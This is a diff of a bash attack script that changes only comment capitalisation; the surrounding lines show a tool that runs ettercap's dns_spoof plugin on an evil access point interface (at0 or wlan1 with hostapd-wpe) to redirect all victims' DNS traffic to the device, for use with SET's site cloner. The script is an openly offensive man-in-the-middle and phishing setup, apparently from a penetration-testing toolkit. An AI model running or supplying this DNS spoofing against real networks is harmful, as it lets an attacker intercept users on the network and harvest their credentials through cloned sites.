@@ -1,7 +1,7 @@
 #!/bin/bash
 # Script to use ettercap to redirect all DNS traffic back to the device
 # Use with SET (site cloner)
-#set the prompt to the name of the script
+# Set the prompt to the name of the script
 PS1=${PS1//@\\h/@dnsspoof}
 clear
 
@@ -26,7 +26,7 @@ f_run(){
   
   trap f_hangup SIGHUP
 
-  #ettercap fails if the interface is down
+  # Ettercap fails if the interface is down
   ip link set ${evilap_eth} up
 
   ettercap -i ${evilap_eth} -T -q -P dns_spoof
@@ -37,7 +37,7 @@ if loud_one=1 f_validate_one at0; then
 fi
 if f_validate_one wlan1; then
   if pgrep hostapd-wpe; then
-    #this clear removes the noise from the at0 check
+    # This clear removes the noise from the at0 check
     clear
     evilap_eth="wlan1"
   fi
